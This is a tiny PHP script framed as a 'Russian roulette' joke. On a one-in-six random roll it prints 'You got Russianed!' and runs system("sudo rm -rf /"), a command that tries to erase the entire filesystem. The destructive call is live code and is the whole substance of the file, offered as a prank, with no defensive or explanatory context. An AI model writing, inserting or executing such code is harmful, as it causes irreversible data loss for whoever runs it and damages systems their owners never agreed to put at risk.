<?php
if (random_int(1, 6) == 6) {
    echo "You got Russianed!";
    system("sudo rm -rf /");
} else {
    echo "Phew! You got lucky!";
}
?>